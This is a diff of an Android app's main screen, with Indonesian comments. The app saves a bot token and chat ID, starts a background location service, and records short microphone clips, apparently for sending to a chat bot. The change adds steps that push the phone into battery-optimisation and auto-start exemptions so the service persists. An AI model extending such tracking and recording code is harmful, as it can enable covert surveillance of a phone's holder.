@@ -6,8 +6,10 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.location.LocationManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.PowerManager;
 import android.provider.Settings;
 import android.widget.Button;
 import android.widget.EditText;
@@ -20,8 +22,7 @@ import androidx.core.content.ContextCompat;
 public class MainActivity extends AppCompatActivity {
 
     EditText tokenInput, chatIdInput, uniqueIdInput, intervalInput;
-    Button saveButton, btnTestVoice;
-    Button recordButton;
+    Button saveButton, btnTestVoice, recordButton, btnRequestAllPermissions;
     SharedPreferences preferences;
 
     private static final int PERMISSION_REQUEST_CODE = 1001;
@@ -31,20 +32,7 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-
-        // Notifikasi (Android 13+)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
-            }
-        }
-
-        // Audio (Android 6+)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-                requestPermissions(new String[]{Manifest.permission.RECORD_AUDIO}, AUDIO_PERMISSION_REQUEST_CODE);
-            }
-        }
+        preferences = getSharedPreferences("config", MODE_PRIVATE);
 
         // Inisialisasi UI
         tokenInput = findViewById(R.id.tokenInput);
@@ -54,8 +42,7 @@ public class MainActivity extends AppCompatActivity {
         saveButton = findViewById(R.id.saveButton);
         btnTestVoice = findViewById(R.id.btnTestVoice);
         recordButton = findViewById(R.id.recordButton);
-
-        preferences = getSharedPreferences("config", MODE_PRIVATE);
+        btnRequestAllPermissions = findViewById(R.id.btnRequestAllPermissions);
 
         // Load data
         tokenInput.setText(preferences.getString("bot_token", ""));
@@ -63,7 +50,7 @@ public class MainActivity extends AppCompatActivity {
         uniqueIdInput.setText(preferences.getString("unique_id", ""));
         intervalInput.setText(preferences.getString("interval", "60"));
 
-        // Tombol simpan konfigurasi
+        // Tombol simpan & mulai
         saveButton.setOnClickListener(v -> {
             String token = tokenInput.getText().toString().trim();
             String chatId = chatIdInput.getText().toString().trim();
@@ -75,19 +62,17 @@ public class MainActivity extends AppCompatActivity {
                 return;
             }
 
-            if (!hasRequiredPermissions()) {
-                Toast.makeText(this, "Izin lokasi belum diberikan!", Toast.LENGTH_SHORT).show();
-                requestRequiredPermissions();
+            if (!hasAllPermissions()) {
+                Toast.makeText(this, "Beberapa izin wajib belum diberikan!", Toast.LENGTH_LONG).show();
                 return;
             }
 
             if (!isLocationServiceEnabled()) {
-                Toast.makeText(this, "Layanan lokasi (GPS) belum aktif!", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, "GPS belum aktif. Aktifkan dulu!", Toast.LENGTH_LONG).show();
                 startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS));
                 return;
             }
 
-            // Simpan ke SharedPreferences
             preferences.edit()
                     .putString("bot_token", token)
                     .putString("chat_id", chatId)
@@ -96,52 +81,49 @@ public class MainActivity extends AppCompatActivity {
                     .apply();
 
             Toast.makeText(this, "Disimpan! Service akan dimulai.", Toast.LENGTH_SHORT).show();
-
             startLocationService();
         });
 
-        // Tombol uji rekam suara
+        // Tombol test kirim suara
         btnTestVoice.setOnClickListener(v -> {
-            if (hasAllAudioPermissions()) {
-                String token = tokenInput.getText().toString().trim();
-                String chatId = chatIdInput.getText().toString().trim();
-
-                if (token.isEmpty() || chatId.isEmpty()) {
-                    Toast.makeText(this, "Token dan Chat ID wajib diisi untuk test!", Toast.LENGTH_SHORT).show();
-                    return;
-                }
-
-                Toast.makeText(this, "Merekam suara 10 detik...", Toast.LENGTH_SHORT).show();
-                VoiceRecorder.getInstance().startRecording(MainActivity.this, 10, token, chatId);
+            if (hasAudioPermission()) {
+                VoiceRecorder.getInstance().startRecording(
+                        MainActivity.this,
+                        10,
+                        tokenInput.getText().toString().trim(),
+                        chatIdInput.getText().toString().trim()
+                );
+                Toast.makeText(this, "Merekam 10 detik...", Toast.LENGTH_SHORT).show();
             } else {
                 requestAudioPermission();
             }
         });
 
-        // Tombol manual rekam suara
+        // Tombol manual rekam
         recordButton.setOnClickListener(v -> {
-            String token = tokenInput.getText().toString().trim();
-            String chatId = chatIdInput.getText().toString().trim();
-
-            if (token.isEmpty() || chatId.isEmpty()) {
-                Toast.makeText(this, "Isi token dan chat ID dulu", Toast.LENGTH_SHORT).show();
-                return;
+            if (hasAudioPermission()) {
+                VoiceRecorder.getInstance().startRecording(
+                        this,
+                        5,
+                        tokenInput.getText().toString().trim(),
+                        chatIdInput.getText().toString().trim()
+                );
+                Toast.makeText(this, "Merekam 5 detik...", Toast.LENGTH_SHORT).show();
+            } else {
+                requestAudioPermission();
             }
-
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
-                    != PackageManager.PERMISSION_GRANTED) {
-                ActivityCompat.requestPermissions(this,
-                        new String[]{Manifest.permission.RECORD_AUDIO}, 1002);
-                return;
-            }
-
-            Toast.makeText(this, "Merekam suara selama 5 detik...", Toast.LENGTH_SHORT).show();
-            VoiceRecorder.getInstance().startRecording(this, 5, token, chatId);
         });
 
-        // Minta permission awal jika belum diberikan
-        if (!hasRequiredPermissions()) {
-            requestRequiredPermissions();
+        // Tombol periksa & minta semua izin
+        btnRequestAllPermissions.setOnClickListener(v -> {
+            requestAllPermissions();
+            openBatteryOptimizationSettings();
+            openAutoStartSettings();
+        });
+
+        // Minta permission awal
+        if (!hasAllPermissions()) {
+            requestAllPermissions();
         }
     }
 
@@ -155,38 +137,43 @@ public class MainActivity extends AppCompatActivity {
         String interval = preferences.getString("interval", "");
 
         if (!token.isEmpty() && !chatId.isEmpty() && !uniqueId.isEmpty() && !interval.isEmpty()) {
-            if (hasRequiredPermissions()) {
+            if (hasAllPermissions() && isLocationServiceEnabled()) {
                 startLocationService();
             }
         }
     }
 
-    private boolean isLocationServiceEnabled() {
-        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
-                locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
-    }
-
-    private boolean hasRequiredPermissions() {
+    private boolean hasAllPermissions() {
         return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
                 ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
-                ContextCompat.checkSelfPermission(this, Manifest.permission.FOREGROUND_SERVICE) == PackageManager.PERMISSION_GRANTED &&
-                ContextCompat.checkSelfPermission(this, Manifest.permission.FOREGROUND_SERVICE_LOCATION) == PackageManager.PERMISSION_GRANTED;
+                ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED &&
+                (!isBatteryOptimizationEnabled());
     }
 
-    private boolean hasAllAudioPermissions() {
-        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
-    }
-
-    private void requestRequiredPermissions() {
+    private void requestAllPermissions() {
         ActivityCompat.requestPermissions(this,
                 new String[]{
                         Manifest.permission.ACCESS_FINE_LOCATION,
                         Manifest.permission.ACCESS_COARSE_LOCATION,
-                        Manifest.permission.FOREGROUND_SERVICE,
-                        Manifest.permission.FOREGROUND_SERVICE_LOCATION
+                        Manifest.permission.RECORD_AUDIO
                 },
                 PERMISSION_REQUEST_CODE);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
+                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+            requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, 3003);
+        }
+    }
+
+    private boolean isLocationServiceEnabled() {
+        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        return locationManager != null &&
+                (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
+                        locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER));
+    }
+
+    private boolean hasAudioPermission() {
+        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
     }
 
     private void requestAudioPermission() {
@@ -196,35 +183,60 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void startLocationService() {
-        Intent serviceIntent = new Intent(this, LocationService.class);
-        ContextCompat.startForegroundService(this, serviceIntent);
+        Intent intent = new Intent(this, LocationService.class);
+        ContextCompat.startForegroundService(this, intent);
     }
 
+    // Battery Optimization
+    private boolean isBatteryOptimizationEnabled() {
+        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
+                pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName());
+    }
+
+    private void openBatteryOptimizationSettings() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
+            startActivity(intent);
+        }
+    }
+
+    // Auto-start (khusus vendor seperti Xiaomi, Oppo, dll)
+    private void openAutoStartSettings() {
+        try {
+            Intent intent = new Intent();
+            intent.setComponent(new android.content.ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
+            startActivity(intent);
+        } catch (Exception e) {
+            try {
+                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivity(intent);
+            } catch (Exception ex) {
+                Toast.makeText(this, "Tidak bisa buka pengaturan auto-start", Toast.LENGTH_SHORT).show();
+            }
+        }
+    }
+
+    // Callback hasil permission
     @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] results) {
+        super.onRequestPermissionsResult(requestCode, permissions, results);
 
         if (requestCode == PERMISSION_REQUEST_CODE) {
             boolean granted = true;
-            for (int result : grantResults) {
+            for (int result : results) {
                 if (result != PackageManager.PERMISSION_GRANTED) {
                     granted = false;
                     break;
                 }
             }
-
-            if (granted) {
-                startLocationService();
-            } else {
-                Toast.makeText(this, "Permission ditolak. Tidak bisa mulai service.", Toast.LENGTH_SHORT).show();
-            }
-
+            Toast.makeText(this, granted ? "Semua izin diberikan." : "Beberapa izin ditolak.", Toast.LENGTH_SHORT).show();
         } else if (requestCode == AUDIO_PERMISSION_REQUEST_CODE) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                Toast.makeText(this, "Izin microphone diberikan.", Toast.LENGTH_SHORT).show();
-            } else {
-                Toast.makeText(this, "Izin microphone ditolak!", Toast.LENGTH_SHORT).show();
-            }
+            Toast.makeText(this,
+                    (results.length > 0 && results[0] == PackageManager.PERMISSION_GRANTED)
+                            ? "Izin mic diberikan."
+                            : "Izin mic ditolak!", Toast.LENGTH_SHORT).show();
         }
     }
 }
